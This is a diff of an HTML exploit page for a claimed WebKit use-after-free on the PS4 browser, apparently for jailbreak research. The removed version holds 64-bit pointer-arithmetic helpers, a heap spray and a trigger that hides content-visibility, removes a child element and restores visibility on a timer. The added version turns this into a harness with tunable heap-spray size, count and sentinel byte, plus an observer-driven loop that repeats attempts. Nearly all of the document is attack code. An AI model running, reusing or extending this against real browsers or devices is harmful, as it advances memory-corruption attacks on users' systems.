@@ -1,328 +1,408 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit Heap UaF PoC (All-in-One)</title>
-    <style>
-        body { font-family: monospace; background-color: #f0f0f0; padding: 20px; }
-        .container { 
-            border: 2px dashed #333; 
-            padding: 20px; 
-            margin-bottom: 20px; 
-            background: #fff;
-        }
-        .child { 
-            width: 100px; 
-            height: 100px; 
-            background-color: blue; 
-            border: 2px solid darkblue;
-        }
-        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
-        #log-area { margin-top: 20px; border-top: 1px solid #ccc; padding-top: 10px; }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>PS4 WebKit RenderLayer content-visibility UAF Harness (Controlled + Amplified)</title>
 </head>
 <body>
+  <h1>PS4 WebKit – RenderLayer content-visibility + remove() Harness</h1>
 
-    <h2>WebKit UaF PoC (RenderLayer)</h2>
-    <p>Clique abaixo para iniciar a sequência de trigger.</p>
-    <button onclick="runExploit()">Iniciar PoC</button>
+  <p>
+    <b>Objetivo:</b> Executar tentativas controladas e amplificadas com logs claros:
+    tentativa, timing (ms), estado do DOM, e parâmetros do spray (tamanho/quantidade).
+  </p>
 
-    <div class="container">
-        <div class="child"></div>
-    </div>
+  <hr>
 
-    <div id="log-area"><h3>Logs:</h3></div>
+  <h2>DOM alvo</h2>
+  <div class="container" style="width: 220px; height: 220px; border: 1px solid #444; position: relative;">
+    <div class="child" style="width: 80px; height: 80px; background: #00f; position: absolute; top: 20px; left: 20px;"></div>
+  </div>
+
+  <p>
+    <button id="btnReset">Reset DOM</button>
+  </p>
+
+  <hr>
+
+  <h2>Modo Controlado (sem observer)</h2>
+  <p>
+    <button id="btnRunOnce">Run once</button>
+    <label style="margin-left: 12px;">
+      Delay (ms):
+      <input id="inpDelay" type="number" value="0" min="0" max="1000" step="1" style="width: 90px;">
+    </label>
+  </p>
+
+  <hr>
+
+  <h2>Modo Amplificador (observer com trava)</h2>
+  <p>
+    <button id="btnStartAmp">Start Amplified</button>
+    <button id="btnStopAmp">Stop</button>
+
+    <label style="margin-left: 12px;">
+      Max tentativas:
+      <input id="inpMaxAttempts" type="number" value="20" min="1" max="200" step="1" style="width: 90px;">
+    </label>
+
+    <label style="margin-left: 12px;">
+      Auto-delay (ms):
+      <input id="inpAmpDelay" type="number" value="0" min="0" max="1000" step="1" style="width: 90px;">
+    </label>
+  </p>
+
+  <hr>
+
+  <h2>Parâmetros do Spray (parametrizado e escalonado)</h2>
+  <p>
+    <label>
+      Chunk size (bytes) inicial:
+      <input id="inpChunkSize" type="number" value="4096" min="256" max="65536" step="256" style="width: 110px;">
+    </label>
+
+    <label style="margin-left: 12px;">
+      Chunks inicial:
+      <input id="inpChunks" type="number" value="1500" min="0" max="20000" step="50" style="width: 110px;">
+    </label>
+
+    <label style="margin-left: 12px;">
+      Step (aumentar chunks por tentativa):
+      <input id="inpStep" type="number" value="250" min="0" max="5000" step="50" style="width: 110px;">
+    </label>
+
+    <label style="margin-left: 12px;">
+      Max chunks:
+      <input id="inpMaxChunks" type="number" value="8000" min="0" max="30000" step="100" style="width: 110px;">
+    </label>
+  </p>
+
+  <p>
+    <label>
+      Preencher bytes (touch heap):
+      <input id="chkFill" type="checkbox" checked>
+    </label>
+
+    <label style="margin-left: 12px;">
+      Sentinela:
+      <input id="inpSentinel" type="text" value="0x41" style="width: 80px;">
+    </label>
+  </p>
+
+  <hr>
+
+  <h2>Log</h2>
+  <p>
+    <button id="btnClear">Clear log</button>
+  </p>
+  <pre id="log" style="white-space: pre-wrap; border: 1px solid #333; padding: 10px; min-height: 240px;"></pre>
 
 <script>
-/* ==========================================
-   PARTE 1: int64.mjs (Matemática de Ponteiros)
-   ========================================== */
+(() => {
+  const $ = (id) => document.getElementById(id);
+  const logEl = $("log");
 
-function check_range(x) {
-    return (-0x80000000 <= x) && (x <= 0xffffffff);
-}
+  function nowMs() { return (typeof performance !== "undefined" && performance.now) ? performance.now() : Date.now(); }
+  function log(line) { logEl.textContent += line + "\n"; }
+  function hr() { log("------------------------------------------------------------"); }
 
-function unhexlify(hexstr) {
-    if (hexstr.substring(0, 2) === "0x") {
-        hexstr = hexstr.substring(2);
-    }
-    if (hexstr.length % 2 === 1) {
-        hexstr = '0' + hexstr;
-    }
-    if (hexstr.length % 2 === 1) {
-        throw TypeError("Invalid hex string");
-    }
-
-    let bytes = new Uint8Array(hexstr.length / 2);
-    for (let i = 0; i < hexstr.length; i += 2) {
-        let new_i = hexstr.length - 2 - i;
-        let substr = hexstr.slice(new_i, new_i + 2);
-        bytes[i / 2] = parseInt(substr, 16);
-    }
-
-    return bytes;
-}
-
-function operation(f, nargs) {
-    return function () {
-        if (arguments.length !== nargs)
-            throw Error("Not enough arguments for function " + f.name);
-        let new_args = [];
-        for (let i = 0; i < arguments.length; i++) {
-            if (!(arguments[i] instanceof Int)) {
-                new_args[i] = new Int(arguments[i]);
-            } else {
-                new_args[i] = arguments[i];
-            }
-        }
-        return f.apply(this, new_args);
+  // DOM references resolved dynamically to avoid null-on-load issues.
+  function getDOM() {
+    return {
+      container: document.querySelector(".container"),
+      child: document.querySelector(".child")
     };
-}
-
-class Int {
-    constructor(low, high) {
-        let buffer = new Uint32Array(2);
-        let bytes = new Uint8Array(buffer.buffer);
-
-        if (arguments.length > 2) {
-            throw TypeError('Int takes at most 2 args');
-        }
-        if (arguments.length === 0) {
-            throw TypeError('Int takes at min 1 args');
-        }
-        let is_one = false;
-        if (arguments.length === 1) {
-            is_one = true;
-        }
-
-        if (!is_one) {
-            if (typeof (low) !== 'number'
-                && typeof (high) !== 'number') {
-                throw TypeError('low/high must be numbers');
-            }
-        }
-
-        if (typeof low === 'number') {
-            if (!check_range(low)) {
-                throw TypeError('low not a valid value: ' + low);
-            }
-            if (is_one) {
-                high = 0;
-                if (low < 0) {
-                    high = -1;
-                }
-            } else {
-                if (!check_range(high)) {
-                    throw TypeError('high not a valid value: ' + high);
-                }
-            }
-            buffer[0] = low;
-            buffer[1] = high;
-        } else if (typeof low === 'string') {
-            bytes.set(unhexlify(low));
-        } else if (typeof low === 'object') {
-            if (low instanceof Int) {
-                bytes.set(low.bytes);
-            } else {
-                if (low.length !== 8)
-                    throw TypeError("Array must have exactly 8 elements.");
-                bytes.set(low);
-            }
-        } else {
-            throw TypeError('Int does not support your object for conversion');
-        }
-
-        this.buffer = buffer;
-        this.bytes = bytes;
-
-        this.eq = operation(function eq(b) {
-            const a = this;
-            return a.low() === b.low() && a.high() === b.high();
-        }, 1);
-
-        this.neg = operation(function neg() {
-            let type = this.constructor;
-            let low = ~this.low();
-            let high = ~this.high();
-            let res = (new Int(low, high)).add(1);
-            return new type(res);
-        }, 0);
-
-        this.add = operation(function add(b) {
-            let type = this.constructor;
-            let low = this.low();
-            let high = this.high();
-            low += b.low();
-            let carry = 0;
-            if (low > 0xffffffff) {
-                carry = 1;
-            }
-            high += carry + b.high();
-            low &= 0xffffffff;
-            high &= 0xffffffff;
-            return new type(low, high);
-        }, 1);
-
-        this.sub = operation(function sub(b) {
-            let type = this.constructor;
-            b = b.neg();
-            let low = this.low();
-            let high = this.high();
-            low += b.low();
-            let carry = 0;
-            if (low > 0xffffffff) {
-                carry = 1;
-            }
-            high += carry + b.high();
-            low &= 0xffffffff;
-            high &= 0xffffffff;
-            return new type(low, high);
-        }, 1);
-    }
-
-    low() { return this.buffer[0]; }
-    high() { return this.buffer[1]; }
-
-    toString(is_pretty) {
-        if (!is_pretty) {
-            let low = this.low().toString(16).padStart(8, '0');
-            let high = this.high().toString(16).padStart(8, '0');
-            return '0x' + high + low;
-        }
-        let high = this.high().toString(16).padStart(8, '0');
-        high = high.substring(0, 4) + '_' + high.substring(4);
-        let low = this.low().toString(16).padStart(8, '0');
-        low = low.substring(0, 4) + '_' + low.substring(4);
-        return '0x' + high + '_' + low;
-    }
-}
-Int.Zero = new Int(0);
-Int.One = new Int(1);
-
-
-/* ==========================================
-   PARTE 2: utils.mjs (Utilitários)
-   ========================================== */
-
-function die(msg) {
-    alert(msg);
-    // undefinedFunction(); // Comentado para não parar o script de forma feia no teste
-    throw new Error(msg);
-}
-
-function debug_log(msg) {
-    let textNode = document.createTextNode(msg);
-    let p = document.createElement("p");
-    p.appendChild(textNode);
-    // Modificado para anexar ao log-area se existir, senão ao body
-    let logArea = document.getElementById("log-area") || document.body;
-    logArea.appendChild(p);
-    console.log(msg);
-}
-
-function clear_log() {
-    let logArea = document.getElementById("log-area");
-    if(logArea) logArea.innerHTML = "<h3>Logs:</h3>";
-    else document.body.innerHTML = null;
-}
-
-function str2array(str, length, offset) {
-    if (offset === undefined) {
-        offset = 0;
-    }
-    let a = new Array(length);
-    for (let i = 0; i < length; i++) {
-        a[i] = str.charCodeAt(i + offset);
-    }
-    return a;
-}
-
-function align(a, alignment) {
-    if (!(a instanceof Int)) {
-        a = new Int(a);
-    }
-    const mask = -alignment & 0xffffffff;
-    let type = a.constructor;
-    let low = a.low() & mask;
-    return new type(low, a.high());
-}
-
-
-/* ==========================================
-   PARTE 3: poc.js (Lógica do Exploit)
-   ========================================== */
-
-// Seletores globais
-let container;
-let child;
-
-function initDomElements() {
-    container = document.querySelector(".container");
-    child = document.querySelector(".child");
-}
-
-function heapSpray() {
-  debug_log("Iniciando Heap Spray...");
-  let spray = [];
-  for (let i = 0; i < 10000; i++) {
-    let arr = new Uint8Array(0x1000);
-    for (let j = 0; j < arr.length; j++) {
-      arr[j] = 0x41; // Preenche com 'A'
-    }
-    spray.push(arr);
   }
-  debug_log("Heap Spray concluído.");
-  return spray;
-}
 
-function triggerUAF() {
-  if(!container || !child) {
-      debug_log("Erro: Elementos DOM não encontrados. Reiniciando referências.");
-      initDomElements();
-      if(!child) { // Se child foi removido anteriormente, precisamos recriar para testar de novo
-          debug_log("Recriando elemento filho...");
-          child = document.createElement("div");
-          child.className = "child";
-          container.appendChild(child);
+  function domState() {
+    const { container, child } = getDOM();
+    return {
+      containerExists: !!container,
+      childExists: !!child,
+      childInDOM: !!(child && child.isConnected),
+      containerCV: container ? String(container.style.contentVisibility || "(empty)") : "(no container)"
+    };
+  }
+
+  function parseSentinel(s) {
+    // Accept "0x41" or "65"
+    try {
+      if (typeof s !== "string") return 0x41;
+      s = s.trim().toLowerCase();
+      if (s.startsWith("0x")) return Math.max(0, Math.min(255, parseInt(s, 16) | 0));
+      return Math.max(0, Math.min(255, parseInt(s, 10) | 0));
+    } catch (_) {
+      return 0x41;
+    }
+  }
+
+  // Heap spray returns references to prevent immediate GC
+  function heapSpray({ chunkSize, chunks, fill, sentinelByte }) {
+    const arr = new Array(chunks);
+    for (let i = 0; i < chunks; i++) {
+      const u8 = new Uint8Array(chunkSize);
+      if (fill) {
+        u8.fill(sentinelByte);
       }
+      arr[i] = u8;
+    }
+    return arr;
   }
 
-  debug_log("Alterando content-visibility para hidden...");
-  container.style.contentVisibility = "hidden";
-  
-  debug_log("Removendo elemento filho (Free)...");
-  child.remove();
-  
-  // setTimeout com 0ms cria a condição de corrida
-  setTimeout(() => {
-    debug_log("Restaurando content-visibility (Trigger Recompute)...");
-    container.style.contentVisibility = "auto";
-    
-    // Tenta ocupar a memória liberada imediatamente
-    let spray = heapSpray();
-    
-    debug_log("UAF disparado. Se o navegador não travar, a memória pode estar corrompida.");
-  }, 0);
-}
+  // Global harness state
+  const state = {
+    attempt: 0,
+    running: false,
+    ampEnabled: false,
+    ampMaxAttempts: 20,
+    ampObserver: null,
+    lastSpray: null,
+    stats: {
+      started: 0,
+      completed: 0,
+      jsErrors: 0
+    }
+  };
 
-// Configuração do MutationObserver
-const observer = new MutationObserver(() => {
-  debug_log("Árvore DOM modificada (Observer), tentando UAF...");
-  triggerUAF();
-});
+  function readSprayConfig() {
+    const chunkSize = Math.max(256, Math.min(65536, parseInt($("inpChunkSize").value, 10) || 4096));
+    const chunks0 = Math.max(0, Math.min(30000, parseInt($("inpChunks").value, 10) || 0));
+    const step = Math.max(0, Math.min(5000, parseInt($("inpStep").value, 10) || 0));
+    const maxChunks = Math.max(0, Math.min(30000, parseInt($("inpMaxChunks").value, 10) || chunks0));
+    const fill = !!$("chkFill").checked;
+    const sentinelByte = parseSentinel($("inpSentinel").value);
 
-// Função ligada ao botão
-function runExploit() {
-    initDomElements();
-    
-    // Ativa o observer
-    observer.observe(container, { childList: true, subtree: true });
-    
-    debug_log("Iniciando sequência manual...");
-    triggerUAF();
-}
+    return { chunkSize, chunks0, step, maxChunks, fill, sentinelByte };
+  }
 
+  function computeChunksForAttempt(attemptIndex) {
+    // attemptIndex starts at 1
+    const cfg = readSprayConfig();
+    const raw = cfg.chunks0 + (attemptIndex - 1) * cfg.step;
+    const chunks = Math.min(cfg.maxChunks, Math.max(0, raw));
+    return { ...cfg, chunks };
+  }
+
+  function printHeader(kind, attemptIndex, delayMs, sprayCfg) {
+    const t = new Date();
+    const ds = domState();
+    log(`[${t.toISOString()}] ${kind} attempt #${attemptIndex}`);
+    log(`  delayMs=${delayMs}`);
+    log(`  DOM: container=${ds.containerExists} childExists=${ds.childExists} childInDOM=${ds.childInDOM} container.contentVisibility=${ds.containerCV}`);
+    log(`  spray: chunkSize=${sprayCfg.chunkSize} chunks=${sprayCfg.chunks} fill=${sprayCfg.fill} sentinelByte=0x${sprayCfg.sentinelByte.toString(16)}`);
+  }
+
+  function classifyDOMAfter() {
+    const ds = domState();
+    log(`  POST DOM: childInDOM=${ds.childInDOM} container.contentVisibility=${ds.containerCV}`);
+  }
+
+  function safeSetContentVisibility(container, value) {
+    try { container.style.contentVisibility = value; return true; } catch (_) { return false; }
+  }
+
+  function runAttempt({ kind, delayMs }) {
+    if (state.running) {
+      log(`[WARN] Ignored: already running.`);
+      return;
+    }
+
+    const { container, child } = getDOM();
+    if (!container) {
+      log(`[ERROR] No .container found. Use "Reset DOM" first.`);
+      return;
+    }
+    if (!child) {
+      log(`[WARN] No .child found (already removed). Use "Reset DOM" first.`);
+      return;
+    }
+
+    state.running = true;
+    state.attempt += 1;
+
+    const attemptIndex = state.attempt;
+    const sprayCfg = computeChunksForAttempt(attemptIndex);
+
+    state.stats.started += 1;
+    const t0 = nowMs();
+
+    printHeader(kind, attemptIndex, delayMs, sprayCfg);
+
+    // Step 1: content-visibility hidden
+    const ok1 = safeSetContentVisibility(container, "hidden");
+    log(`  step1: set content-visibility:hidden => ${ok1}`);
+
+    // Step 2: remove child
+    let ok2 = false;
+    try {
+      child.remove();
+      ok2 = true;
+    } catch (e) {
+      ok2 = false;
+      log(`  step2: child.remove() EXCEPTION => ${String(e)}`);
+    }
+    log(`  step2: child.remove() => ${ok2}`);
+
+    // Step 3: restore content-visibility after delay, then spray
+    setTimeout(() => {
+      const t1 = nowMs();
+      let ok3 = safeSetContentVisibility(container, "auto");
+      log(`  step3: set content-visibility:auto => ${ok3}`);
+
+      // Optional "pipeline marker": layout read
+      // This is not exploitation; it helps classify scheduling sensitivity.
+      let rect = null;
+      try {
+        rect = container.getBoundingClientRect();
+        log(`  marker: getBoundingClientRect => w=${Math.round(rect.width)} h=${Math.round(rect.height)}`);
+      } catch (e) {
+        log(`  marker: getBoundingClientRect EXCEPTION => ${String(e)}`);
+      }
+
+      // Step 4: heap spray (parametrized/scaled)
+      let ok4 = true;
+      try {
+        state.lastSpray = heapSpray(sprayCfg);
+      } catch (e) {
+        ok4 = false;
+        state.stats.jsErrors += 1;
+        log(`  step4: heapSpray EXCEPTION => ${String(e)}`);
+      }
+      log(`  step4: heapSpray => ${ok4} (refs kept)`);
+
+      classifyDOMAfter();
+
+      const t2 = nowMs();
+      const dtTotal = (t2 - t0).toFixed(2);
+      const dtDelay = (t1 - t0).toFixed(2);
+      log(`  timing: to setTimeout callback=${dtDelay}ms; total=${dtTotal}ms`);
+
+      // Completion bookkeeping
+      state.stats.completed += 1;
+
+      // Print running stats
+      log(`  stats: started=${state.stats.started} completed=${state.stats.completed} jsErrors=${state.stats.jsErrors}`);
+      hr();
+
+      state.running = false;
+
+      // Amplified mode: if enabled, schedule next attempt through a mutation nudge.
+      if (state.ampEnabled) {
+        if (state.attempt >= state.ampMaxAttempts) {
+          log(`[AMP] Reached max attempts (${state.ampMaxAttempts}). Stopping.`);
+          stopAmplified();
+          return;
+        }
+
+        // Small, controlled DOM nudge to produce a mutation event.
+        // This encourages the observer path without infinite recursion.
+        try {
+          const n = document.createElement("div");
+          n.textContent = "n";
+          n.style.display = "none";
+          container.appendChild(n);
+          container.removeChild(n);
+        } catch (_) { /* ignore */ }
+      }
+    }, delayMs);
+  }
+
+  function resetDOM() {
+    const container = document.querySelector(".container");
+    if (!container) return;
+
+    // Remove existing child if present
+    const existing = container.querySelector(".child");
+    if (existing) existing.remove();
+
+    // Recreate child
+    const c = document.createElement("div");
+    c.className = "child";
+    c.style.width = "80px";
+    c.style.height = "80px";
+    c.style.background = "#00f";
+    c.style.position = "absolute";
+    c.style.top = "20px";
+    c.style.left = "20px";
+    container.appendChild(c);
+
+    // Reset content-visibility to empty/auto baseline
+    container.style.contentVisibility = "";
+    log(`[RESET] DOM restored: .child recreated; container.contentVisibility cleared.`);
+    hr();
+  }
+
+  function startAmplified() {
+    if (state.ampEnabled) {
+      log(`[AMP] Already enabled.`);
+      return;
+    }
+
+    // Configure cap
+    state.ampMaxAttempts = Math.max(1, Math.min(200, parseInt($("inpMaxAttempts").value, 10) || 20));
+
+    const { container } = getDOM();
+    if (!container) {
+      log(`[ERROR] No .container found. Use "Reset DOM" first.`);
+      return;
+    }
+
+    state.ampEnabled = true;
+
+    // Create observer with "running" lock and attempt cap.
+    state.ampObserver = new MutationObserver((mutList) => {
+      if (!state.ampEnabled) return;
+      if (state.running) return;
+      if (state.attempt >= state.ampMaxAttempts) return;
+
+      // Only trigger on meaningful childList mutations
+      let meaningful = false;
+      for (const m of mutList) {
+        if (m.type === "childList") { meaningful = true; break; }
+      }
+      if (!meaningful) return;
+
+      const delayMs = Math.max(0, Math.min(1000, parseInt($("inpAmpDelay").value, 10) || 0));
+      runAttempt({ kind: "AMPLIFIED", delayMs });
+    });
+
+    state.ampObserver.observe(container, { childList: true, subtree: true });
+
+    log(`[AMP] Enabled. Max attempts=${state.ampMaxAttempts}. Observer armed with running-lock.`);
+    hr();
+
+    // Kick off first attempt immediately (observer will continue from mutations we nudge).
+    const delayMs = Math.max(0, Math.min(1000, parseInt($("inpAmpDelay").value, 10) || 0));
+    runAttempt({ kind: "AMPLIFIED", delayMs });
+  }
+
+  function stopAmplified() {
+    state.ampEnabled = false;
+    if (state.ampObserver) {
+      try { state.ampObserver.disconnect(); } catch (_) {}
+      state.ampObserver = null;
+    }
+    log(`[AMP] Disabled.`);
+    hr();
+  }
+
+  // Wire UI
+  $("btnClear").addEventListener("click", () => { logEl.textContent = ""; });
+  $("btnReset").addEventListener("click", resetDOM);
+
+  $("btnRunOnce").addEventListener("click", () => {
+    const delayMs = Math.max(0, Math.min(1000, parseInt($("inpDelay").value, 10) || 0));
+    runAttempt({ kind: "CONTROLLED", delayMs });
+  });
+
+  $("btnStartAmp").addEventListener("click", startAmplified);
+  $("btnStopAmp").addEventListener("click", stopAmplified);
+
+  // Initial banner
+  log(`[INIT] Harness loaded. Use "Reset DOM" then "Run once" or "Start Amplified".`);
+  hr();
+})();
 </script>
 </body>
 </html>
